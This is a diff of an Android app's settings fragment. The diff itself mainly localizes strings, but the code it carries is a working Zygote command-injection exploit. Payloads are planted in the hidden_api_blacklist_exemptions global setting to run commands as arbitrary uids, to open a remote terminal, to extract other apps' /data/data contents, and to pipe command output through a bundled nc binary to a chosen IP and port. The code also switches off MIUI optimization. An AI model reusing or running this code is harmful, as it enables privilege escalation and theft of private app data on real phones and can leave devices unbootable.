@@ -33,6 +33,7 @@ import com.google.android.material.dialog.MaterialAlertDialogBuilder;
 import com.google.android.material.snackbar.Snackbar;
 import com.google.android.material.textfield.TextInputLayout;
 import com.wqry085.deployesystem.hellodream;
+import com.wqry085.deployesystem.next.init_kernel;
 import com.wqry085.deployesystem.payloadtext;
 import com.wqry085.deployesystem.sockey.ZygoteControlClient;
 import com.wqry085.deployesystem.sockey.ZygoteControlListener;
@@ -175,31 +176,31 @@ findPreference(KEY_terminal).setOnPreferenceClickListener(this);
         shell.setOnPreferenceClickListener(new Preference.OnPreferenceClickListener() {
             @Override
             public boolean onPreferenceClick(Preference preference) {
-                    MaterialDialogHelper.showConfirmDialog(getActivity(), "创建远程终端", "确定吗应用会尝试使用uid("+setuid_input.getText().toString()+")创建远程终端 创建前请确保之前的远程终端已结束", 
-        (dialog, which) -> {
-           int currentVersion = android.os.Build.VERSION.SDK_INT;
-        
-        // 根据Android版本选择不同的资源
-        if (currentVersion >= android.os.Build.VERSION_CODES.S && 
-            currentVersion <= android.os.Build.VERSION_CODES.TIRAMISU) {
-            //安卓11以上的实现
-            String android1213=replaceSetIds(Get_Payload(),setuid_input.getText().toString(),setgid_input.getText().toString(),editTextPreferenceeee.getText().toString())+"/system/bin/logwrapper echo zYg0te $(/system/bin/setsid "+getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+setuid_input.getText().toString()+")"+payload_buffer();
-                                
-              runpayload(android1213);
-                                
-                        } else {
-            runpayload(replaceSetIds(Get_Payload(),setuid_input.getText().toString(),setgid_input.getText().toString(),editTextPreferenceeee.getText().toString())+"echo $(setsid " + getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+setuid_input.getText().toString()+");"+payload_buffer());
-        }
-                            MaterialDialogHelper.showSimpleDialog(getActivity(), "创建结束", "如成功请在任意终端模拟器执行nc 127.0.0.1 8080");
-        });
+                MaterialDialogHelper.showConfirmDialog(getActivity(), getString(R.string.create_remote_terminal), String.format(getString(R.string.confirm_create_remote_terminal), setuid_input.getText().toString()),
+                        (dialog, which) -> {
+                            int currentVersion = android.os.Build.VERSION.SDK_INT;
+
+                            // 根据Android版本选择不同的资源
+                            if (currentVersion >= android.os.Build.VERSION_CODES.S &&
+                                    currentVersion <= android.os.Build.VERSION_CODES.TIRAMISU) {
+                                //安卓11以上的实现
+                                String android1213=replaceSetIds(Get_Payload(),setuid_input.getText().toString(),setgid_input.getText().toString(),editTextPreferenceeee.getText().toString())+"/system/bin/logwrapper echo zYg0te $(/system/bin/setsid "+getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+setuid_input.getText().toString()+")"+payload_buffer();
+
+                                runpayload(android1213);
+
+                            } else {
+                                runpayload(replaceSetIds(Get_Payload(),setuid_input.getText().toString(),setgid_input.getText().toString(),editTextPreferenceeee.getText().toString())+"echo $(setsid " + getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+setuid_input.getText().toString()+");"+payload_buffer());
+                            }
+                            MaterialDialogHelper.showSimpleDialog(getActivity(), getString(R.string.create_end), getString(R.string.create_end_success));
+                        });
                 return false;
             }
         });
         skkk.setOnPreferenceClickListener(new Preference.OnPreferenceClickListener() {
             @Override
             public boolean onPreferenceClick(Preference preference) {
-                    
-                            MaterialDialogHelper.showSimpleDialog(getActivity(), "警告", "在Android12及以上，情况变得非常复杂，命令解析现在由NativeCommandBuffer完成，即该解析器在解析一次内容之后，对于未识别的trailing内容，它将丢弃缓冲区中的所有内容并退出，而不是留作下一次解析。这意味着命令注入的内容会被直接丢弃！各个设备厂商可能都不一致请调整配置poc默认的配置并不一定可靠请做好设备不开机的准备");
+
+                MaterialDialogHelper.showSimpleDialog(getActivity(), getString(R.string.warning), getString(R.string.android12_warning));
                 return false;
             }
         });
@@ -231,8 +232,8 @@ private void toggleAdvancedSettings() {
                 serverSocket = new ServerSocket(port);
 
                 handler.post(() -> {
-                    appendLog("服务器已启动，端口: " + port);
-                    updateStatus("运行中");
+                    appendLog(getString(R.string.server_started_port, port));
+                    updateStatus(getString(R.string.running));
                     findPreference(KEY_START).setEnabled(false);
                     findPreference(KEY_STOP).setEnabled(true);
                 });
@@ -243,7 +244,7 @@ private void toggleAdvancedSettings() {
                 }
             } catch (IOException e) {
                 if (!isRunning) return; // Normal shutdown
-                handler.post(() -> appendLog("服务器错误: " + e.getMessage()));
+                handler.post(() -> appendLog(getString(R.string.server_error, e.getMessage())));
             }
         }
 
@@ -253,9 +254,9 @@ private void toggleAdvancedSettings() {
                 if (serverSocket != null) {
                     serverSocket.close();
                 }
-                handler.post(() -> appendLog("服务器已停止"));
+                handler.post(() -> appendLog(getString(R.string.server_stopped)));
             } catch (IOException e) {
-                handler.post(() -> appendLog("停止错误: " + e.getMessage()));
+                handler.post(() -> appendLog(getString(R.string.stop_error, e.getMessage())));
             }
         }
 
@@ -278,7 +279,7 @@ private void toggleAdvancedSettings() {
         ClientHandler(Socket socket) {
             this.clientSocket = socket;
             this.clientIp = socket.getInetAddress().getHostAddress();
-            handler.post(() -> appendLog("客户端连接: " + clientIp));
+            handler.post(() -> appendLog(getString(R.string.client_connected, clientIp)));
         }
 
         @Override
@@ -290,10 +291,10 @@ private void toggleAdvancedSettings() {
                 while ((inputLine = in.readLine()) != null) {
                      message = inputLine;
                 }
-                 final String end =message;
-                handler.post(() -> appendLog(clientIp + " 说: " + end));
+                final String end =message;
+                handler.post(() -> appendLog(clientIp + getString(R.string.said) + end));
             } catch (IOException e) {
-                handler.post(() -> appendLog(clientIp + " 断开连接"));
+                handler.post(() -> appendLog(clientIp + getString(R.string.disconnected)));
             } finally {
                 try {
                     clientSocket.close();
@@ -316,7 +317,7 @@ private void toggleAdvancedSettings() {
         if (serverThread != null) {
             serverThread.shutdown();
             serverThread = null;
-            updateStatus("已停止");
+            updateStatus(getString(R.string.stopped));
             findPreference(KEY_START).setEnabled(true);
             findPreference(KEY_STOP).setEnabled(false);
         }
@@ -330,23 +331,23 @@ private void toggleAdvancedSettings() {
         if (KEY_IP.equals(key)) {
             String ip = (String) newValue;
             if (!isValidIp(ip)) {
-                showToast("无效IP地址");
+                showToast(getString(R.string.invalid_ip_address));
                 return false;
             }
-            appendLog("IP更新为: " + ip);
+            appendLog(getString(R.string.ip_updated, ip));
             return true;
         }
         else if (KEY_PORT.equals(key)) {
             try {
                 int port = Integer.parseInt((String) newValue);
                 if (port < 1024 || port > 65535) {
-                    showToast("端口必须为1024-65535");
+                    showToast(getString(R.string.port_must_be_1024_65535));
                     return false;
                 }
-                appendLog("端口更新为: " + port);
+                appendLog(getString(R.string.port_updated, port));
                 return true;
             } catch (NumberFormatException e) {
-                showToast("无效端口号");
+                showToast(getString(R.string.invalid_port));
                 return false;
             }
         }
@@ -362,61 +363,57 @@ private void toggleAdvancedSettings() {
             return true;
         }else if(top_data.equals(key)){
             MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(getActivity());
-        builder.setTitle("提取应用数据");
-        LayoutInflater inflater = LayoutInflater.from(getActivity());
-        View dialogView = inflater.inflate(R.layout.appdir, null);
-        builder.setView(dialogView);
-        final TextInputLayout textInputLayout = dialogView.findViewById(R.id.text_input_layout);
-        final EditText editText = textInputLayout.getEditText(); // 正确获取EditText的方式
-        builder.setPositiveButton("运行", (dialog, which) -> {
-                    
-            if (editText != null) {
-                String inputText = editText.getText().toString().trim();
-                if (inputText.isEmpty()) {
-                    textInputLayout.setError("输入内容不能为空");
-                } else {
-                            if(!isAppInstalled(getActivity(),editText.getText().toString())){
-                                Snackbar snackbar = Snackbar.make(getView(), "应用不存在", Snackbar.LENGTH_SHORT);
-        snackbar.setAction("ok", new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                        
-            }
-        });
-        
-        snackbar.show();
-                                return;
-                            }
-                    int uid =getUidByPackageName(getActivity(),editText.getText().toString());
-                   int currentVersion = android.os.Build.VERSION.SDK_INT;
-        if (currentVersion >= android.os.Build.VERSION_CODES.S && 
-            currentVersion <= android.os.Build.VERSION_CODES.TIRAMISU) {
-            String android1213=replaceSetIds(Get_Payload(),uid+"",uid+"",editTextPreferenceeee.getText().toString())+"/system/bin/logwrapper echo zYg0te $(/system/bin/setsid "+getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+uid+" --app-dir=/data/data/"+editText.getText().toString()+":56423"+")"+payload_buffer();
-                                
-              runpayload(android1213);
-                                
-                        } else {
-            runpayload(replaceSetIds(Get_Payload(),uid+"",uid+"",editTextPreferenceeee.getText().toString())+"echo \"$(setsid " + getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+uid+" --app-dir=/data/data/"+editText.getText().toString()+":56423);"+payload_buffer());
-        }
-                            Snackbar snackbar = Snackbar.make(getView(), "payload已注入", Snackbar.LENGTH_SHORT);
-        snackbar.setAction("ok", new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                        
-            }
-        });
-        
-        snackbar.show();
-                            }         
-                        
-            }
-        });
+            builder.setTitle(getString(R.string.extract_app_data));
+            LayoutInflater inflater = LayoutInflater.from(getActivity());
+            View dialogView = inflater.inflate(R.layout.appdir, null);
+            builder.setView(dialogView);
+            final TextInputLayout textInputLayout = dialogView.findViewById(R.id.text_input_layout);
+            final EditText editText = textInputLayout.getEditText(); // 正确获取EditText的方式
+            builder.setPositiveButton(getString(R.string.run), (dialog, which) -> {
 
-        builder.setNegativeButton("取消", (dialog, which) -> {
-            dialog.cancel();
-        });
-        AlertDialog dialog = builder.create();
-        dialog.show();
+                if (editText != null) {
+                    String inputText = editText.getText().toString().trim();
+                    if (inputText.isEmpty()) {
+                        textInputLayout.setError(getString(R.string.input_cannot_be_empty));
+                    } else {
+                        if(!isAppInstalled(getActivity(),editText.getText().toString())){
+                            Snackbar snackbar = Snackbar.make(getView(), getString(R.string.app_not_exist), Snackbar.LENGTH_SHORT);
+                            snackbar.setAction(getString(R.string.ok), new View.OnClickListener() {
+                                @Override
+                                public void onClick(View v) {}
+                            });
+
+                            snackbar.show();
+                            return;
+                        }
+                        int uid =getUidByPackageName(getActivity(),editText.getText().toString());
+                        int currentVersion = android.os.Build.VERSION.SDK_INT;
+                        if (currentVersion >= android.os.Build.VERSION_CODES.S &&
+                                currentVersion <= android.os.Build.VERSION_CODES.TIRAMISU) {
+                            String android1213=replaceSetIds(Get_Payload(),uid+"",uid+"",editTextPreferenceeee.getText().toString())+"/system/bin/logwrapper echo zYg0te $(/system/bin/setsid "+getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+uid+" --app-dir=/data/data/"+editText.getText().toString()+":56423"+")"+payload_buffer();
+
+                            runpayload(android1213);
+
+                        } else {
+                            runpayload(replaceSetIds(Get_Payload(),uid+"",uid+"",editTextPreferenceeee.getText().toString())+"echo \"$(setsid " + getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+uid+" --app-dir=/data/data/"+editText.getText().toString()+":56423);"+payload_buffer());
+                        }
+                        Snackbar snackbar = Snackbar.make(getView(), getString(R.string.payload_injected), Snackbar.LENGTH_SHORT);
+                        snackbar.setAction(getString(R.string.ok), new View.OnClickListener() {
+                            @Override
+                            public void onClick(View v) {}
+                        });
+
+                        snackbar.show();
+                    }
+
+                }
+            });
+
+            builder.setNegativeButton(getString(R.string.cancel), (dialog, which) -> {
+                dialog.cancel();
+            });
+            AlertDialog dialog = builder.create();
+            dialog.show();
         }else if (KEY_STOP.equals(key)) {
             stopServer();
             return true;
@@ -428,29 +425,27 @@ private void toggleAdvancedSettings() {
 							getActivity().startActivity(xh);
                 getActivity().finish();
             }else{
-            int currentVersion = android.os.Build.VERSION.SDK_INT;
-        
-        // 根据Android版本选择不同的资源
-        if (currentVersion >= android.os.Build.VERSION_CODES.S && 
-            currentVersion <= android.os.Build.VERSION_CODES.TIRAMISU) {
-            //安卓11以上的实现
-            String android1213=replaceSetIds(Get_Payload(),setuid_input.getText().toString(),setgid_input.getText().toString(),editTextPreferenceeee.getText().toString())+"/system/bin/logwrapper echo zYg0te $("+editTextPreference.getText().toString()+" | "+ getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_nc.so "+editTextPreferencee.getText().toString()+" "+editTextPreferenceee.getText().toString()+")"+payload_buffer();
-                runpayload(android1213);
-                        } else {
-            runpayload(replaceSetIds(Get_Payload(),setuid_input.getText().toString(),setgid_input.getText().toString(),editTextPreferenceeee.getText().toString())+"echo \"$(" + editTextPreference.getText().toString()+")\" | "+ getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_nc.so " + editTextPreferencee.getText().toString() + " "+editTextPreferenceee.getText().toString()+";"+payload_buffer());
-        }
-            Snackbar snackbar = Snackbar.make(getView(), ">>>>>>>> payload", Snackbar.LENGTH_SHORT);
-        snackbar.setAction("ok", new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                        
-            }
-        });
-        
-        snackbar.show();
-              
+                int currentVersion = android.os.Build.VERSION.SDK_INT;
+
+                // 根据Android版本选择不同的资源
+                if (currentVersion >= android.os.Build.VERSION_CODES.S &&
+                        currentVersion <= android.os.Build.VERSION_CODES.TIRAMISU) {
+                    //安卓11以上的实现
+                    String android1213=replaceSetIds(Get_Payload(),setuid_input.getText().toString(),setgid_input.getText().toString(),editTextPreferenceeee.getText().toString())+"/system/bin/logwrapper echo zYg0te $("+editTextPreference.getText().toString()+" | "+ getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_nc.so "+editTextPreferencee.getText().toString()+" "+editTextPreferenceee.getText().toString()+")"+payload_buffer();
+                    runpayload(android1213);
+                } else {
+                    runpayload(replaceSetIds(Get_Payload(),setuid_input.getText().toString(),setgid_input.getText().toString(),editTextPreferenceeee.getText().toString())+"echo \"$(" + editTextPreference.getText().toString()+")\" | "+ getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_nc.so " + editTextPreferencee.getText().toString() + " "+editTextPreferenceee.getText().toString()+";"+payload_buffer());
                 }
-            
+                Snackbar snackbar = Snackbar.make(getView(), getString(R.string.payload_arrow), Snackbar.LENGTH_SHORT);
+                snackbar.setAction(getString(R.string.ok), new View.OnClickListener() {
+                    @Override
+                    public void onClick(View v) {}
+                });
+
+                snackbar.show();
+
+            }
+
         }else if(KEY_terminal.equals(key)){
             Intent  xh=new Intent( );
 							xh.setClass(getActivity(),TerminalActivity.class);
@@ -499,13 +494,13 @@ private void toggleAdvancedSettings() {
         ShizukuExec("am force-stop com.android.settings");
         ShizukuExec("echo '"+payload+"' > /data/local/tmp/只读配置.txt");
         ContentValues values = new ContentValues();
-                values.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
-                values.put(Settings.Global.VALUE, payload);
-                try {
-                    getActivity().getContentResolver().insert(Uri.parse("content://settings/global"), values);
-                } catch (Exception e) {
-                   MaterialDialogHelper.showSimpleDialog(getActivity(), "加载payload失败", e.toString());
-                }
+        values.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
+        values.put(Settings.Global.VALUE, payload);
+        try {
+            getActivity().getContentResolver().insert(Uri.parse("content://settings/global"), values);
+        } catch (Exception e) {
+            MaterialDialogHelper.showSimpleDialog(getActivity(), getString(R.string.load_payload_failed), e.toString());
+        }
         ShizukuExec("am start -n com.android.settings/.Settings");
         new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
     @Override
@@ -542,7 +537,7 @@ private void toggleAdvancedSettings() {
 
             int exitCode = p.waitFor();
             if (exitCode!= 0) {
-                output.append("漏洞部署结束: ").append(exitCode);
+                output.append(init_kernel.getAppContext().getString(R.string.vuln_deploy_end)).append(exitCode);
             }
             return output.toString();
         } catch (Exception e) {
@@ -714,7 +709,7 @@ public String[] getMultiSelectedTexts(Context context, String preferenceKey) {
      
      
     
-    public static String insertParamsAfter(String originalText, String anchorParam, String[] newParams) {
+    public String insertParamsAfter(String originalText, String anchorParam, String[] newParams) {
         if (originalText == null || originalText.isEmpty()) {
             return originalText;
         }
@@ -728,7 +723,7 @@ public String[] getMultiSelectedTexts(Context context, String preferenceKey) {
                     .replace(m.start(), m.end(), String.valueOf(paramCount + newParams.length))
                     .toString();
         } else {
-            throw new IllegalArgumentException("未找到参数总数数字！");
+            throw new IllegalArgumentException(getString(R.string.param_count_not_found));
         }
         String[] lines = originalText.split("(?<=\n)", -1);
 
@@ -754,7 +749,7 @@ public String[] getMultiSelectedTexts(Context context, String preferenceKey) {
         }
 
         if (!inserted) {
-            throw new IllegalArgumentException("未找到锚点参数: " + anchorParam);
+            throw new IllegalArgumentException(getString(R.string.anchor_param_not_found, anchorParam));
         }
 
         return result.toString();
@@ -779,7 +774,7 @@ public String[] getMultiSelectedTexts(Context context, String preferenceKey) {
         if (TextUtils.isEmpty(packageName)) {
             return false;
         }
-        
+
         try {
             PackageManager packageManager = context.getPackageManager();
             packageManager.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
@@ -850,22 +845,22 @@ public String[] getMultiSelectedTexts(Context context, String preferenceKey) {
     }
     }
     void dis_miui_optimization() {
-    try {
-        String currentValue = Settings.Secure.getString(getActivity().getContentResolver(), "miui_optimization");
-        if (currentValue == null) {
-            return;
+        try {
+            String currentValue = Settings.Secure.getString(getActivity().getContentResolver(), "miui_optimization");
+            if (currentValue == null) {
+                return;
+            }
+            int currentState = Settings.Secure.getInt(getActivity().getContentResolver(), "miui_optimization", -1);
+            if (currentState == 1) {
+                Toast.makeText(getActivity(), getString(R.string.please_disable_miui_optimization), Toast.LENGTH_SHORT).show();
+                Settings.Secure.putInt(getActivity().getContentResolver(), "miui_optimization", 0);
+            }
+        } catch (SecurityException e) {
+            Toast.makeText(getActivity(),"MIUI_OPT: "+e.toString(),Toast.LENGTH_SHORT).show();
+        } catch (Exception e) {
+            Toast.makeText(getActivity(),"MIUI_OPT: "+e.toString(),Toast.LENGTH_SHORT).show();
         }
-        int currentState = Settings.Secure.getInt(getActivity().getContentResolver(), "miui_optimization", -1);
-        if (currentState == 1) {
-            Toast.makeText(getActivity(),"请关闭MIUI优化！！！",Toast.LENGTH_SHORT).show();
-            Settings.Secure.putInt(getActivity().getContentResolver(), "miui_optimization", 0);
-        }
-    } catch (SecurityException e) {
-        Toast.makeText(getActivity(),"MIUI_OPT: "+e.toString(),Toast.LENGTH_SHORT).show();
-    } catch (Exception e) {
-        Toast.makeText(getActivity(),"MIUI_OPT: "+e.toString(),Toast.LENGTH_SHORT).show();
     }
-}
     String payload_buffer(){
         String buffer=" ";
         if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R){
